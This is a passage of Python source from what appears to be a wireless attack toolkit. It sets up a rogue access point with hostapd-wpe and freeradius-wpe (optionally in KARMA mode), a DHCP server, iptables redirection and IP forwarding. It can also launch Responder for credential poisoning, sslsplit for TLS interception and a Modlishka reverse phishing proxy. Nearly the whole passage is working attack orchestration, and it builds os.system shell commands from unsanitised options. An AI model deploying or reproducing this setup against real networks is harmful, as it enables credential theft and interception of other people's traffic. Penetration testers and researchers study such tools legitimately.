                cert_dir=config.certs_dir,
                log_goodpass=options['log_goodpass'],
                log_badpass=options['log_badpass']
            )
            conf_manager.freeradius_default_available_site_conf.configure(
            )
            conf_manager.freeradius_eap_conf.configure(
                default_eap_type=options['default_eap_type'],
                private_key_password=options['server_private_key_password'],
                private_key_file=options['server_private_key'],
                certificate_file=options['server_certificate'],
                ca_file=options['ca_certificate'],
                dh_file=config.dh_file,
                ca_path=config.certs_dir,
                supported_eap_type=options['supported_eap_type']
            )
            conf_manager.freeradius_clients_conf.configure(
                own_ip_addr=options['own_ip_addr'],
                auth_server_shared_secret=options['auth_server_shared_secret'],
                radius_protocol=options['radius_protocol']
            )
            print("[*] Launching freeradius-wpe")
            utils.Freeradius.hardstart(config.freeradius_command % (config.freeradius_log, config.freeradius_working_dir), verbose=False)

        ##### Launching Program #####

        conf_manager.default_dhcp.configure(
            default_dhcpv4_conf_location=config.default_dhcpv4_conf_location,
            interface=options['interface']
        )

        conf_manager.dhcpd_conf.configure(
            default_lease_time=options['default_lease_time'],
            max_lease_time=options['max_lease_time'],
            name_servers=("%s, %s" % (options['primary_name_server'], options['secondary_name_server'])),
            router=options['ip_address'],
            route_gateway=rogueClass.dhcpRoute(options['ip_address']),
            route_cidr=rogueClass.dhcpCidr(options['dhcp_netmask']),
            route_subnet=rogueClass.dhcpRoute(options['route_subnet']),
            dhcp_subnet=options['dhcp_subnet'],
            dhcp_netmask=options['dhcp_netmask'],
            dhcp_pool_start=options['dhcp_pool_start'],
            dhcp_pool_end=options['dhcp_pool_end']
        )

        # sets the local ip address of the wireless interface before startign the dhcp service
        os.system('ifconfig %s %s netmask %s' % (options['interface'], options['ip_address'], options['dhcp_netmask']))
        rogueClass.dhcpiptablesStart()
        utils.IscDhcpServer.start()

        print("[*] Launching hostapd-wpe")
        if(options['karma']):
            utils.Hostapd.hardstart(config.hostapd_command_with_karma % config.hostapd_conf_full, verbose=False)
        if(options['debug']):
            utils.Hostapd.hardstart(config.hostapd_command_with_debug % config.hostapd_conf_full, verbose=False)
        if(options['ddebug']):
            utils.Hostapd.hardstart(config.hostapd_command_with_ddebug % config.hostapd_conf_full, verbose=False)
        else:
            utils.Hostapd.hardstart(config.hostapd_command % (config.hostapd_conf_full), verbose=False)

        ##### Middle Operations #####


        if(options['internet']):
            print("[*] Enabling IP forwarding")
            utils.set_ipforward(1)
        else:
            pass

        # sets the ipv6 link-local address of the wireless interface
        print('[-] Enabling IPv6 on %s interface, setting link-local address: %s' % (options['interface'], options['ipv6_address']))
        os.system('sudo ifconfig %s inet6 add %s/64' % (options['interface'], options['ipv6_address']))

        if(options['responder'] is True):
            print("[+] Generating responder configuration file...")
            if(options['responder'] is True and options['modlishka'] is False):
                conf_manager.responder_default_conf.configure(
                    do_not_respond_to_own_ip_addr=config.default_ip_address
                    )
                utils.Responder.hardstart(config.responder_cmd % (
                    options['interface']
                    ),
                    verbose=False
                )
            elif(options['responder'] is True and options['modlishka'] is True):
                conf_manager.responder_no_http_conf.configure(
                    do_not_respond_to_own_ip_addr=config.default_ip_address
                    )
                utils.Responder.hardstart(config.responder_cmd % (
                    options['interface']
                    ),
                    verbose=False
                )
            else:
                pass
        else:
            pass

        if(options['sslsplit'] is True and options['cert_nopass'] is False):

            utils.Sslsplit.hardstart(config.sslsplit_cmd % (
                config.sslsplit_log,
                config.sslsplit_jail,
                config.sslsplit_tmp,
                config.ca_key,
                config.ca_crt,
                options['sslsplit_encrypted_port']
                ))

            rogueClass.sslsplitiptablesStart(options['sslsplit_encrypted_port'])
        else:
            pass

        if(options['modlishka'] is True):
            utils.Modlishka.hardstart(config.modlishka_cmd % (
                options['modlishka_proxydomain'],
                options['modlishka_proxyaddress'],
                options['modlishka_controlURL'],
                options['modlishka_controlCreds'],
                options['modlishka_listeningaddress'],
                options['modlishka_target']))

        # pause execution until user quits
        input('Press enter to quit...')

    except KeyboardInterrupt:
        rogueClass.rogue_shutdown(options)
        exit(0)

    rogueClass.rogue_shutdown(options)
    endtime=datetime.now()
    print("[-] Ending rogue at: {}".format(endtime))
    print("[-] Rogue Duration: {} seconds".format((endtime-starttime).seconds))

    exit(0)
